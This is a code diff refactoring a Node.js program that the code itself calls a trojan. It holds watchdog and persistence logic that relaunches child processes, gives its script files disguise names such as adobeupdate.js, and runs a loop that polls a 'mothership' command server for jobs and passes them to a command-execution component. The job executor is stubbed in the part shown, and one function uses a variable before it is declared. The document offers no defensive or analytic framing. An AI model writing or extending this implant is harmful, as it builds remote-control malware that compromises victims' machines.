@@ -287,11 +287,31 @@ var systemstate = {
 };
 
 class CmdConfig {
-    #cmdname = '';
-    #launchprocname = ''; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
-    #launchscriptfname = ''; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
-    #childprocess = null; 
-    #childcmds = [];
+    #__cmdname = '';
+    #__launchprocname = ''; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
+    #__launchscriptfname = ''; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
+    #__childprocess = null; 
+    #__childcmds = [];
+
+    get childprocess() {
+        return this.#__childprocess;
+    };
+
+    get launchscriptfname() {
+        return this.#__launchscriptfname;
+    };
+
+    get cmdname() {
+        return this.#__cmdname;
+    };
+
+    get launchprocname() {
+        return this.#__launchprocname;
+    };
+
+    get childcmds() {
+        return this.#__childcmds;
+    };
 
     loopfunc = async () => { logmsg('doing some work inside loop...'); }; // should be overriden
 
@@ -299,7 +319,7 @@ class CmdConfig {
 
     constructor(tcmdname) {
         if ( CmdConfig.isCmdExist(tcmdname)  )
-            this.cmdname = tcmdname;
+            this.#__cmdname = tcmdname;
         else
             throw new Error('cmd is not supported ['+tcmdname+']');
     };
@@ -347,24 +367,37 @@ class CmdConfig {
     activate() {
         logmsg('starting');
 
+        let execlaunch = false;
+
         let tcmdpid = this.readcmdpid();
 
-        let cmdprocess = tcmdpid == -1 ? null : getProcess(tcmdpid);
-
-        if ( tcmdpid > 0 && isPidAlive(tcmdpid) ) { 
-            
-            let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : 'UNKNOWN';
-
-            // TODO: need to change 'node' to instance variable -- each CmdConfig should have its
-            //       launching process set during launch
-            if ( ( ! cmdprocess ) ||  ( cmdprocess && procname.includes('node') ) ) {
-                logmsg('finished -- no need to launch -- cmd is running ['+this.cmdname+'] pid='+this.cmdpid+' process name='+procname);
-                return;
-            }
-
+        if ( tcmdpid <= 0 ) {
+            this.launch();
+            logmsg('finished');
+            return;
         }
-    
-        this.launch();
+
+        let ispidalive = isPidAlive(tcmdpid);
+
+        if ( ! ispidalive ) {
+            this.launch();
+            logmsg('finished');
+            return;
+        }
+
+        let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : 'UNKNOWN';
+
+        if ( ispidalive ) {
+            let cmdprocess = getProcess(tcmdpid);
+
+            if  ( cmdprocess &&  ( ! procname.includes(this.launchprocname) ) ) { // TODO test this mechanism
+                this.launch();
+                logmsg('finished');
+                return;    
+            }
+        }
+
+        logmsg(`finished -- no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid} process name=${procname}`);
 
         logmsg('finished');
     };
@@ -408,9 +441,9 @@ class CmdConfig {
         // ! this is only for node.exe and nodejs scripts
         const child = fork(systemstate.trojanfpath, [this.cmdname]);
         
-        this.childprocess = child;
-        this.launchprocname = path.basename(child.spawnargs[0]);
-        this.launchscriptfname = path.basename(systemstate.trojanfpath);
+        this.#__childprocess = child;
+        this.#__launchprocname = path.basename(child.spawnargs[0]);
+        this.#__launchscriptfname = path.basename(systemstate.trojanfpath);
 
         let tchildproc = getProcess(child.pid);
 
@@ -431,6 +464,7 @@ class CmdConfig {
 
     };
 
+    // TODO
     exitramp() {
         // killall --> exit without deleting
         // reset_ & tcmdname & loop --> delete then exit
@@ -477,8 +511,15 @@ class CmdConfig {
                 await sleep(1000); 
             }
         }
-    }
+    };
     
+    addchildcmd(cmdconfig) {
+        
+        if ( ! this.childcmds )
+            this.childcmds = [];
+
+        this.childcmds.push(cmdconfig);
+    };
 };
 
 function isChildHealthy(childProcess) {
@@ -875,8 +916,8 @@ function isAsyncFunction(fn) {
   
 // --- startup
 
-logmsg("starting -- cmdname=" + systemstate.cmdname + ' ts='+systemstate.scriptts);
-logmsg('scriptmd5='+systemstate.scriptmd5);
+logmsg(`starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts}`);
+logmsg(`scriptmd5=${systemstate.scriptmd5}`);
 
 initProcessList();
 
@@ -884,16 +925,26 @@ ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
 
 // --- IPC for current running process: message send/receive
 
+var handleMessage = function(msg) {
+    // overriden by child cmds (ping, cmdlist)
+}
+
 // receives messages from parent process -- should be used by cmdlist, ping
 process.on('message', (message) => {
-    // TODO: process incoming messages
+    if ( ! message ) {
+        throw new Error('null message');
+    }
 
-    logmsg(`[CHILD] received from parent:` + JSON.stringify(message));
+    logmsg(`incomming message:` + JSON.stringify(message));
+
+    if ( handleMessage ) {
+        handleMessage(message);
+    }
 
 });
 
 // sends message to parent process -- should be called by cmdlist, ping
-function sendMessage(dest, msgpayload) {
+async function sendMessage(dest, msgpayload) {
     let isvalid = (typeof process.send === 'function' && process.connected );
     const parentPid = process.ppid;
 
@@ -903,10 +954,28 @@ function sendMessage(dest, msgpayload) {
     }
 
     logmsg('[CHILD] sending message to parent pid=' + parentPid);
-    
-    process.send({ senderPid:process.pid, src:systemstate.cmdname, dest:dest, payload:msgpayload, ts:getTimestamp()  });    
-}
 
+    let message = { 
+        senderPid:process.pid, 
+        src:systemstate.cmdname, 
+        dest:dest, 
+        payload:msgpayload, 
+        ts:getTimestamp() 
+    };
+
+    return new Promise((resolve, reject) => {
+        
+        process.send(message, undefined, undefined, (error) => {
+            if (error) 
+                return reject(error);
+
+            resolve();
+
+        });
+
+    });
+
+}
 
 // ---
 
@@ -934,12 +1003,13 @@ function startup() {
 function watchdog() {
     logmsg('starting');
 
-    let ping = new CmdConfig('ping');
-    let cmdlist = new CmdConfig('cmdlist');
+    let pingcmd = new CmdConfig('ping');
+    let cmdlistcmd = new CmdConfig('cmdlist');
     
-    let childcmds = systemstate.childcmds; // revise this to shift childcmds to systemstate.cmdconfig
+    systemstate.cmdconfig.addchildcmd(pingcmd);
+    systemstate.cmdconfig.addchildcmd(cmdlistcmd);
 
-    childcmds.push(ping, cmdlist);
+    let childcmds = systemstate.cmdconfig.childcmds; // anchor
     
     let cmdconfig = systemstate.cmdconfig;
 
@@ -1053,47 +1123,81 @@ function processClientJob(rawtext) {
     return clientjob;
 }
 
+function ping_handleMessage(message) {
+
+}
+
+function cmdlist_handleMessage(message) {
+    // senderPid:process.pid, src:systemstate.cmdname, dest:dest, payload:msgpayload, ts:getTimestamp
+
+    let senderPid = message.senderPid;
+    let src = message.src;
+    let dest = message.dest;
+    let clientjob = message.payload;
+
+    if ( dest != 'cmdlist' ) {
+        return;
+    }
+
+    if ( src != 'ping' ) {
+        return;
+    }
+
+    if ( ! clientjob ) {
+        return;
+    }
+
+    executeJob(clientjob);
+}
+
+async function ping_loop() {
+    let baseUrl = systemstate.mothership + '/ow/ping.php';
+
+    let inputHeaders = null;
+    let params = {
+        clientid: '99998888'
+    };
+    downloadOpts = null;
+    
+    let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
+    
+    let isvalid = validatePingResponse(pingresponse);
+
+    if ( ! isvalid ) {
+        logmsg('ping response is invalid');
+        systemstate.selectMothership();
+        return;
+    }
+
+    let rawtext = pingresponse.rawText;
+
+    let clientjob = processClientJob(rawtext);
+
+    if ( clientjob ) {
+        logmsg('sending job to cmdlist: jobcode='+clientjob.jobcode+' jobtype: '+clientjob.jobtype);
+        await sendMessage('cmdlist', clientjob);
+    }
+}
+
 function ping() {
     logmsg('starting');
 
     let cmdconfig = systemstate.cmdconfig;
+    handleMessage = ping_handleMessage;
 
-    cmdconfig.loopfunc = async () => {
-        baseUrl = systemstate.mothership + '/ow/ping.php';
-
-        let inputHeaders = null;
-        let params = {
-            clientid: '99998888'
-        };
-        downloadOpts = null;
-        
-        let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
-        
-        let isvalid = validatePingResponse(pingresponse);
-
-        if ( ! isvalid ) {
-            logmsg('ping response is invalid');
-            systemstate.selectMothership();
-            return;
-        }
-
-        let rawtext = pingresponse.rawText;
-
-        let clientjob = processClientJob(rawtext);
-
-        if ( clientjob ) {
-            logmsg('executing client job: jobcode='+clientjob.jobcode+' job type: '+clientjob.jobtype);
-            executeJob(clientjob);
-        }
-    };
+    cmdconfig.loopfunc = ping_loop;
 
     cmdconfig.loop();
 
     logmsg('finished');
 }
 
-function executeJob(clientjob) {
-    // send message to watchdog to queue job with cmdlist for execution
+function executeJob(clientjob) {  
+    logmsg('starting');
+    
+    // ... 
+
+    logmsg('finished');
 }
 
 function cmdlist() {
